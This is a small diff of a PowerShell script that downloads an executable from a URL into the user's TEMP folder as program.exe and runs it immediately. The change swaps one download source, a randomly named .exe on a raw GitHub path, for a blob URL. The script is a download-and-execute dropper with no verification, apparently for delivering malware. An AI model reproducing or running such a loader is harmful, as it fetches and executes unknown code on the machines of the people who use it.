@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/fasa3e/pidoryapidor/refs/heads/main/lx3sxpi0z7ym4aqa.exe"
+$url = "blob:https://github.com/818d6568-cc21-4af5-a251-731d6b178162"
 $output = "$env:TEMP\program.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process $output
